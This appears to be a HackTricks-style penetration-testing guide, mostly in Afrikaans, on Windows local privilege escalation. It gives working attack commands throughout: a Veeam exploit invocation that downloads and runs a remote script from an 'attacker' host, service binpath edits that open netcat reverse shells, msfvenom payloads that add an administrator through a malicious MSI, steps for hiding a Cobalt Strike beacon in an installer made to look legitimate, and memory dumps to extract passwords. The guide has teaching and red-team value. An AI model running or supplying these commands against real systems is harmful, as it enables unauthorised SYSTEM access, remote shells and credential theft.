# Windows Plaaslike Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste tool om Windows plaaslike privilege escalation vectors te vind:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Aanvanklike Windows-teorie

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integriteitsvlakke

**As jy nie weet wat integriteitsvlakke in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-sekuriteitskontroles

Daar is verskillende dinge in Windows wat jou kan **verhoed om die stelsel te enumerere**, uitvoerbare lêers te laat loop of selfs **jou aktiwiteite te detecteer**. Jy moet die volgende **bladsy lees** en al hierdie **defense**-**meganismes** **enumerere** voordat jy met die privilege escalation-enumeration begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-prosesse wat deur `RAiLaunchAdminProcess` geloods word, kan misbruik word om High IL te bereik sonder prompts wanneer AppInfo secure-path-kontroles omseil word. Kyk hier na die toegewyde UIAccess/Admin Protection bypass-workflow:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kan misbruik word vir ’n arbitrêre SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Onlangse Windows-builds het ook ’n **SMB arbitrary-port** LPE-pad bekendgestel waar ’n bevoorregte plaaslike NTLM-authentication oor ’n hergebruikte SMB TCP-connection gereflekteer word:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Stelselinligting

### Enumerasie van weergawe-inligting

Kyk of die Windows-weergawe enige bekende vulnerability het (kyk ook na die toegepaste patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe Exploits

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede op te soek. Hierdie databasis bevat meer as 4 700 sekuriteitskwesbaarhede, wat die **massive attack surface** toon wat ’n Windows-omgewing bied.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebou)_

**Plaaslik met stelselinligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos van exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Enige credential/Juicy info in die env variables gestoor?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-transkripsielêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word aangeteken, insluitend uitgevoerde opdragte, opdragaanroepe en dele van skrifte. Volledige uitvoeringsbesonderhede en uitvoerresultate word egter moontlik nie vasgelê nie.

Om dit te aktiveer, volg die instruksies in die "Transcript files"-afdeling van die dokumentasie en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeurtenisse uit PowerShell-logboeke te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

'n Volledige aktiwiteits- en inhoudsrekord van die script se uitvoering word vasgelê, wat verseker dat elke kodeblok gedokumenteer word terwyl dit uitgevoer word. Hierdie proses behou 'n omvattende ouditspoor van elke aktiwiteit, wat waardevol is vir forensiese ondersoeke en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die aantekengebeure vir die Script Block kan in die Windows Event Viewer gevind word by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeurtenisse te sien, kan jy die volgende gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Skywe
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer indien die opdaterings nie http**S** nie, maar http gebruik.

Jy begin deur te kontroleer of die netwerk ’n nie-SSL WSUS-opdatering gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy ’n antwoord soos een van hierdie kry:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan, **is dit uitbuitbaar.** As die laaste registry-waarde gelyk is aan 0, sal die WSUS-inskrywing geïgnoreer word.

Om hierdie vulnerabilities uit te buit, kan jy tools soos [Wsuxploit](https://github.com/pimps/wsuxploit) en [pyWSUS ](https://github.com/GoSecure/pywsus) gebruik - Dit is MiTM weaponized exploit scripts om 'fake' updates in nie-SSL WSUS-verkeer in te spuit.

Lees die navorsing hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lees die volledige verslag hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies is dit die fout wat hierdie bug uitbuit:

> As ons die vermoë het om ons plaaslike user proxy te wysig, en Windows Updates die proxy gebruik wat in Internet Explorer se settings gekonfigureer is, het ons dus die vermoë om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te hardloop om ons eie verkeer te onderskep en code as 'n elevated user op ons asset uit te voer.
>
> Verder, aangesien die WSUS-service die huidige user se settings gebruik, sal dit ook sy certificate store gebruik. As ons 'n self-signed certificate vir die WSUS-hostname genereer en hierdie certificate by die huidige user se certificate store voeg, sal ons beide HTTP- en HTTPS-WSUS-verkeer kan onderskep. WSUS gebruik geen HSTS-agtige meganismes om 'n trust-on-first-use-tipe validasie op die certificate te implementeer nie. As die certificate wat aangebied word deur die user vertrou word en die korrekte hostname het, sal dit deur die service aanvaar word.

Jy kan hierdie vulnerability uitbuit met die tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (sodra dit liberated is).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Baie enterprise agents stel 'n localhost IPC-oppervlak en 'n privileged update channel bloot. As enrollment na 'n attacker-server gedwing kan word en die updater 'n rogue root CA of swak signer checks vertrou, kan 'n local user 'n malicious MSI lewer wat deur die SYSTEM-service geïnstalleer word. Sien hier 'n veralgemeende technique (gebaseer op die Netskope stAgentSvc chain – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stel 'n localhost-service op **TCP/9401** bloot wat attacker-controlled messages verwerk, waardeur arbitrary commands as **NT AUTHORITY\SYSTEM** uitgevoer kan word.

- **Recon**: bevestig die listener en version, byvoorbeeld `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: plaas 'n PoC soos `VeeamHax.exe` met die vereiste Veeam DLLs in dieselfde directory, en trigger dan 'n SYSTEM-payload oor die local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Die diens voer die command as SYSTEM uit.
## KrbRelayUp

'n **local privilege escalation**-kwesbaarheid bestaan in Windows **domain**-omgewings onder spesifieke toestande. Hierdie toestande sluit omgewings in waar **LDAP signing** nie afgedwing word nie, gebruikers oor self-rights beskik wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD)** op te stel, en gebruikers die vermoë het om rekenaars binne die domain te skep. Dit is belangrik om daarop te let dat hierdie **vereistes** met behulp van **default settings** nagekom word.

Vind die **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die aanvalsvloei, kyk na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registers **enabled** is (waarde is **0x1**), kan gebruikers met enige voorreg `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **install** (execute).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter session het, kan jy hierdie tegniek outomatiseer met die module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI`-command van power-up om binne die huidige directory 'n Windows MSI binary te skep om privileges te eskaleer. Hierdie script skryf 'n voorafgecompileerde MSI-installeerder uit wat vra vir die byvoeging van 'n user/group (dus sal jy GIU-toegang benodig):
```
Write-UserAddMSI
```
Voer net die geskepte binary uit om privileges te eskaleer.

### MSI Wrapper

Lees hierdie tutoriaal om te leer hoe om ’n MSI wrapper met hierdie tools te skep. Let daarop dat jy ’n "**.bat**"-lêer kan wrap as jy **net** **command lines** wil **execute**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** met Cobalt Strike of Metasploit ’n **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, kies **Create a new project** en tik "installer" in die soekkassie. Kies die **Setup Wizard**-projek en klik **Next**.
- Gee die projek ’n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Hou aan om **Next** te klik totdat jy by stap 3 van 4 kom (kies lêers om in te sluit). Klik **Add** en kies die Beacon-payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc**-projek in die **Solution Explorer** en verander in die **Properties** **TargetPlatform** van **x86** na **x64**.
- Daar is ander properties wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde app meer legitim kan laat lyk.
- Regsklik op die projek en kies **View > Custom Actions**.
- Regsklik op **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe**-lêer en klik **OK**. Dit verseker dat die beacon-payload uitgevoer word sodra die installer uitgevoer word.
- Verander onder die **Custom Action Properties** **Run64Bit** na **True**.
- Laastens, **build dit**.
- As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` vertoon word, maak seker dat jy die platform op x64 gestel het.

### MSI Installation

Om die **installation** van die kwaadwillige `.msi`-lêer in die **background** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid te buit, kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en Detectors

### Ouditinstellings

Hierdie instellings bepaal wat **aangeteken** word, dus moet jy aandag gee
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding: dit is nuttig om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator-wagwoorde**, en verseker dat elke wagwoord **uniek, ewekansig gegenereer en gereeld opgedateer** word op rekenaars wat by ’n domein aangesluit is. Hierdie wagwoorde word veilig binne Active Directory gestoor en kan slegs verkry word deur gebruikers aan wie voldoende toestemmings deur ACLs toegeken is, wat hulle toelaat om plaaslike admin-wagwoorde te sien indien hulle gemagtig is.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien dit aktief is, word **wagwoorde in gewone teks in LSASS** (Local Security Authority Subsystem Service) gestoor.\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-beskerming

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingestel om pogings deur onbetroubare prosesse om **sy geheue te lees** of kode in te spuit, te **blokkeer**, wat die stelsel verder beveilig.\
[**Meer inligting oor LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is in **Windows 10** bekendgestel. Die doel daarvan is om die credentials wat op ’n toestel gestoor word, teen bedreigings soos pass-the-hash attacks te beskerm.| [**Meer inligting oor Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gekasde geloofsbriewe

**Domeingeloofsbriewe** word deur die **Local Security Authority** (LSA) geverifieer en deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmelddata deur 'n geregistreerde sekuriteitspakket geverifieer word, word domeingeloofsbriewe vir die gebruiker tipies opgestel.\
[**Meer inligting oor Gekasde geloofsbriewe hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Enumereer Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waaraan jy behoort interessante toestemmings het.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy **aan ’n bevoorregte groep behoort, kan jy moontlik voorregte eskaleer**. Leer hier meer oor bevoorregte groepe en hoe om dit te misbruik om voorregte te eskaleer:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-manipulasie

**Leer meer** oor wat ’n **token** is op hierdie bladsy: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Gaan die volgende bladsy na om **meer te leer oor interessante tokens** en hoe om dit te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuisvouers
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Lopende prosesse

### Lêer- en vouertoestemmings

Eerstens, wanneer jy die prosesse lys, **kyk vir wagwoorde binne die proses se opdragreël**.\
Kyk of jy **’n lopende binary kan oorskryf** of skryftoestemmings op die binary-vouer het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) te misbruik:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop; jy kan dit misbruik om voorregte te eskaleer](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Kontroleer die toestemmings van die prosesse se binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer toestemmings van die vouers van die prosesse se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Wagwoordontginning uit geheue

Jy kan 'n geheuestorting van 'n lopende proses skep deur **procdump** van sysinternals te gebruik. Dienste soos FTP het die **aanmeldbesonderhede in onversleutelde teks in die geheue**, probeer om die geheue te stort en die aanmeldbesonderhede te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-toepassings

**Toepassings wat as SYSTEM loop, kan ’n gebruiker toelaat om ’n CMD te begin of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek vir "command prompt", klik op "Click to open Command Prompt"

## Dienste

Service Triggers laat Windows toe om ’n diens te begin wanneer sekere toestande voorkom (named pipe/RPC endpoint-aktiwiteit, ETW-gebeure, IP-beskikbaarheid, toestelaankoms, GPO-verversing, ens.). Selfs sonder SERVICE_START-regte kan jy dikwels bevoorregte dienste begin deur hul triggers te aktiveer. Sien enumeration- en activation-tegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Kry ’n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Toestemmings

Jy kan **sc** gebruik om inligting oor ’n diens te verkry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binary **accesschk** van _Sysinternals_ te hê om die vereiste privilegie-vlak vir elke diens na te gaan.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[U kan accesschk.exe vir XP hier aflaai](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As u hierdie fout kry (byvoorbeeld met SSDPSRV):

_Stelselfout 1058 het voorgekom._\
_Die diens kan nie begin word nie, óf omdat dit gedeaktiveer is óf omdat daar geen geaktiveerde toestelle daaraan gekoppel is nie._

U kan dit aktiveer deur te gebruik
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost van SSDPSRV afhanklik is om te werk (vir XP SP1)**

**Nog ’n oplossing** vir hierdie probleem is om die volgende uit te voer:
```
sc.exe config usosvc start= auto
```
### **Wysig diensbinêre pad**

In die scenario waar die "Authenticated users"-groep **SERVICE_ALL_ACCESS** op 'n diens het, is dit moontlik om die diens se uitvoerbare binêre lêer te wysig. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be verhoog deur verskeie permissions:

- **SERVICE_CHANGE_CONFIG**: Laat herkonfigurasie van die service binary toe.
- **WRITE_DAC**: Maak permission-herkonfigurasie moontlik, wat lei tot die vermoë om service configurations te verander.
- **WRITE_OWNER**: Laat die verkryging van ownership en permission-herkonfigurasie toe.
- **GENERIC_WRITE**: Ervaar die vermoë om service configurations te verander.
- **GENERIC_ALL**: Ervaar ook die vermoë om service configurations te verander.

Vir die opsporing en exploitation van hierdie vulnerability kan _exploit/windows/local/service_permissions_ gebruik word.

### Services binaries met swak permissions

As ’n service as **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, of ’n privileged domain account loop, maar **low-privileged users die service EXE of sy ouerfolder kan wysig**, kan die service dikwels gekaap word deur **die binary te vervang en die service te herbegin**.

**Check of jy die binary wat deur ’n service uitgevoer word, kan wysig** of of jy **write permissions op die folder** het waar die binary geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binary wat deur ’n service uitgevoer word, met **wmic** kry (nie in system32 nie) en jou permissions met **icacls** nagaan:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Soek na gevaarlike ACLs wat aan **`Everyone`**, **`BUILTIN\Users`** of **`Authenticated Users`** toegeken is, veral **`(F)`**, **`(M)`** of **`(W)`** op die diens se executable of op die gids wat dit bevat. ’n Praktiese misbruikvloei is:

1. Bevestig die diensrekening en executable-pad met `sc qc <service_name>`.
2. Bevestig dat die binary skryfbaar is met `icacls <path>`.
3. Vervang die diens se binary met ’n payload of ’n geldige malicious service binary.
4. Herbegin die diens met `sc stop <service_name> && sc start <service_name>` (of wag vir ’n herlaai / diens-sneller).

Nuttige outomatiese kontroles:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Indien die diens nie toelaat dat ’n normale gebruiker dit herbegin nie, kyk of dit outomaties tydens selflaai begin, ’n mislukkingsaksie het wat dit herbegin, of indirek deur die toepassing wat dit gebruik, geaktiveer kan word.

### Wysigtoestemmings vir diensregisters

Jy moet kyk of jy enige diensregister kan wysig.\
Jy kan jou **toestemmings** oor ’n diens-**register** **nagaan** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Daar moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings het. Indien wel, kan die binêre lêer wat deur die diens uitgevoer word, gewysig word.

Om die Path van die binêre lêer wat uitgevoer word te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry-simboliese-skakelwedloop vir arbitrêre HKLM-waardeskryf (ATConfig)

Sommige Windows-**Accessibility**-kenmerke skep per-gebruiker **ATConfig**-sleutels wat later deur ’n **SYSTEM**-proses na ’n HKLM-sessiesleutel gekopieer word. ’n Registry **symbolic link race** kan daardie bevoorregte skryfaksie na **enige HKLM-pad** herlei, wat ’n primitief vir arbitrêre HKLM-**waardeskryf** gee.

Sleutelliggings (voorbeeld: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lys geïnstalleerde **Accessibility**-kenmerke.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stoor gebruikerbeheerde konfigurasie.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` word tydens aanmelding/secure-desktop-oorgange geskep en is deur die gebruiker skryfbaar.

Misbruikvloei (CVE-2026-24291 / ATConfig):

1. Vul die **HKCU ATConfig**-waarde wat jy wil hê deur SYSTEM geskryf moet word.
2. Aktiveer die secure-desktop-kopiëring (byvoorbeeld **LockWorkstation**), wat die AT broker-vloei begin.
3. **Wen die wedloop** deur ’n **oplock** op `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` te plaas; wanneer die oplock aktiveer, vervang die **HKLM Session ATConfig**-sleutel met ’n **registry link** na ’n beskermde HKLM-teiken.
4. SYSTEM skryf die aanvallergekose waarde na die herlei­de HKLM-pad.

Sodra jy arbitrêre HKLM-waardeskryf het, skakel oor na LPE deur dienskonfigurasiewaardes te oorskryf:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

